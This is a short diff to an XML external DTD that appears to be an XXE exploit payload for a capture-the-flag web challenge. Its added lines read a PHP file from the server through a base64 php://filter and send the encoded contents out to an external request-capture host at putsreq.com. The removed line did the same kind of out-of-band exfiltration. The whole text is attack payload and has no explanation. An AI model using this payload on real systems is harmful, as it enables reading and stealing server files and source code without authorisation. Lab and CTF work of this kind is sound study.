@@ -1,2 +1,4 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!ENTITY % param1 "<!ENTITY all SYSTEM "http://putsreq.com/jcVVqYcNb9zESnp2Fqws?%file;">">
+<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://putsreq.com/jcVVqYcNb9zESnp2Fqws?%data;'>">
+
